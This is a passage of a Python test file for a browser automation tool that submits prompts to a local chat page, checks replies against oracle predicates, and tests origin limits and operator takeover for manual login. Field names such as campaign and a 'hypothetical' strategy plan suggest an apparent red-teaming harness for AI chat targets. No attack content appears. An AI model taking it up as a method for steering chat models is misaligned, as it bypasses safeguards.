        ) as session:
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)
            message = next(item for item in snapshot.elements if item.name == "Message")
            send = next(item for item in snapshot.elements if item.name == "Send")
            adapter = reviewed_browser_adapter(origin)
            adapter["browser_steps"] = [
                {
                    "step_id": "fill",
                    "tool": "browser_fill",
                    "arguments": {"element_ref": message.ref},
                },
                {
                    "step_id": "submit",
                    "tool": "browser_click",
                    "arguments": {"element_ref": send.ref},
                },
            ]

            async def allow(*_):
                return True

            result = await ToolBroker(
                browser_tools(lambda _: session, Recorder(), lambda _: adapter),
                confirmer=allow,
            ).invoke(
                "browser_chat_exchange",
                ToolContext(session_id="s1", workspace_root="/tmp", campaign_id="campaign:test"),
                {
                    "prompt": "hello",
                    "strategy_plan": {
                        "observation": "o",
                        "thought": "t",
                        "strategy": ["hypothetical"],
                        "response": "hello",
                    },
                    "strategy_turn_index": 0,
                },
            )

            assert result.is_error is False
            (exchange,) = result.metadata["target_exchanges"]
            assert exchange["response_boundary_observed"] is True
            assert exchange["response_boundary_complete"] is True
            assert "assistant:hello assistant:follow-up" in exchange["response"]
            assert exchange.get("evaluation_uncertain") is not True


@pytest.mark.asyncio
async def test_compiled_chat_exchange_matches_reviewed_visible_text_oracle() -> None:
    chat = b"""
    <textarea aria-label="Message" maxlength="500"></textarea>
    <button aria-label="Send" onclick="
      document.getElementById('reply').textContent=
        'assistant:'+document.querySelector('textarea').value;
    ">Send</button>
    <div id="reply" aria-live="polite"></div>
    """

    class Recorder:
        async def append_action(self, _value):
            return None

        async def append_observation(self, _value):
            return None

        async def record_evidence(self, *_value):
            return None

        async def save_metadata(self, _value):
            return None

    async with web_fixture(chat) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)
            message = next(item for item in snapshot.elements if item.name == "Message")
            send = next(item for item in snapshot.elements if item.name == "Send")
            adapter = reviewed_browser_adapter(origin)
            adapter["browser_steps"] = [
                {
                    "step_id": "fill",
                    "tool": "browser_fill",
                    "arguments": {"element_ref": message.ref},
                },
                {
                    "step_id": "submit",
                    "tool": "browser_click",
                    "arguments": {"element_ref": send.ref},
                },
            ]
            after_probe = await session.snapshot(tab)
            adapter["interaction_contract"]["oracle_predicate"] = {
                "oracle_digest": "sha256:" + "2" * 64,
                "pointer": "/text",
                "match_values": ["Runresult  Send\nassistant:hello"],
                "modality": "text",
                "turn": "multi",
                "language": "en",
            }
            assert "assistant:hello" not in after_probe.text

            async def allow(*_):
                return True

            broker = ToolBroker(
                browser_tools(lambda _: session, Recorder(), lambda _: adapter),
                confirmer=allow,
            )
            result = await broker.invoke(
                "browser_chat_exchange",
                ToolContext(session_id="s1", workspace_root="/tmp", campaign_id="campaign:test"),
                {"prompt": "hello"},
            )

            assert result.is_error is False
            (exchange,) = result.metadata["target_exchanges"]
            assert exchange["oracle_observations"][0]["matched"] is True


@pytest.mark.asyncio
async def test_compiled_chat_exchange_preserves_effect_when_oracle_metadata_is_malformed() -> None:
    chat = b"""
    <textarea aria-label="Message" maxlength="500"></textarea>
    <button aria-label="Send" onclick="
      document.getElementById('reply').textContent=
        'assistant:'+document.querySelector('textarea').value;
    ">Send</button>
    <div id="reply" aria-live="polite"></div>
    """

    class Recorder:
        async def append_action(self, _value):
            return None

        async def append_observation(self, _value):
            return None

        async def record_evidence(self, *_value):
            return None

        async def save_metadata(self, _value):
            return None

    async with web_fixture(chat) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)
            message = next(item for item in snapshot.elements if item.name == "Message")
            send = next(item for item in snapshot.elements if item.name == "Send")
            adapter = reviewed_browser_adapter(origin)
            adapter["browser_steps"] = [
                {
                    "step_id": "fill",
                    "tool": "browser_fill",
                    "arguments": {"element_ref": message.ref},
                },
                {
                    "step_id": "submit",
                    "tool": "browser_click",
                    "arguments": {"element_ref": send.ref},
                },
            ]
            adapter["interaction_contract"]["oracle_predicate"] = {"oracle_digest": "not-a-digest"}

            async def allow(*_):
                return True

            result = await ToolBroker(
                browser_tools(lambda _: session, Recorder(), lambda _: adapter),
                confirmer=allow,
            ).invoke(
                "browser_chat_exchange",
                ToolContext(session_id="s1", workspace_root="/tmp", campaign_id="campaign:test"),
                {"prompt": "hello"},
            )

            assert result.is_error is False
            (exchange,) = result.metadata["target_exchanges"]
            assert exchange["request"] == {"prompt": "hello"}
            assert "assistant:hello" in exchange["response"]
            assert exchange["evaluation_uncertain"] is True
            assert exchange["evaluation_uncertainties"]


def test_browser_oracle_predicates_fail_closed_when_malformed() -> None:
    from merlin_browser.tools import _browser_oracle_predicates

    assert _browser_oracle_predicates({}) == ((), None)
    predicates, error = _browser_oracle_predicates(
        {"oracle_predicate": {"oracle_digest": "sha256:not-a-digest"}}
    )
    assert predicates == ()
    assert error is not None
    predicates, error = _browser_oracle_predicates(
        {
            "oracle_predicates": [
                {
                    "purpose": "objective",
                    "oracle_digest": "sha256:" + "1" * 64,
                    "pointer": "/text",
                    "match_values": ["won"],
                    "modality": "text",
                    "turn": "multi",
                    "language": "en",
                }
            ]
        }
    )
    assert error is None
    assert len(predicates) == 1
    assert predicates[0]["purpose"] == "objective"


@pytest.mark.asyncio
async def test_operator_takeover_allows_external_login_and_restores_automation_bounds() -> None:
    class MetadataStore:
        def __init__(self):
            self.items = {}

        async def save_metadata(self, value):
            self.items[value.context_id] = value

        async def load_metadata(self, context_id):
            return self.items.get(context_id)

        async def list_metadata(self, session_id):
            return [item for item in self.items.values() if item.owner.session_id == session_id]

    async with web_fixture() as target, web_fixture(b"<h1>External login</h1>") as login:

        async def targets(_):
            return BrowserBounds(target_id="target", allowed_origins={target})

        service = BrowserService(MetadataStore(), targets)
        try:
            session = await service.for_tool("s1")
            tab = await session.new_tab(target)
            page = session._tabs[tab]
            with pytest.raises(Exception, match="ERR_BLOCKED_BY_CLIENT"):
                await page.goto(login)
            await page.close()
            tab = await session.new_tab(target)
            page = session._tabs[tab]
            await service.takeover("s1", session.context_id)
            with pytest.raises(BrowserBoundaryError, match="operator control"):
                await service.for_tool("s1")
            with pytest.raises(BrowserBoundaryError, match="operator control"):
                await service._transfer_session_ownership("s2", session)
            await page.goto(login)
            assert await page.locator("h1").last.inner_text() == "External login"
            with pytest.raises(OriginDenied):
                await service.resume("s1", session.context_id)
            assert session.owner.worker_id == "operator"
            events_before = tuple(session._network_events)
            # Response capture must not inspect or retain manual sign-in data.
            await session._record_response(SimpleNamespace(url="https://login.test/token"))
            assert tuple(session._network_events) == events_before
            await page.goto(target)
            await service.resume("s1", session.context_id)
            assert await service.for_tool("s1") is session
            assert session.owner.worker_id == "agent:browser"
            assert session.bounds.allowed_origins == frozenset({target})
            with pytest.raises(Exception, match="ERR_BLOCKED_BY_CLIENT"):
                await page.goto(login)
        finally:
            await service.close()
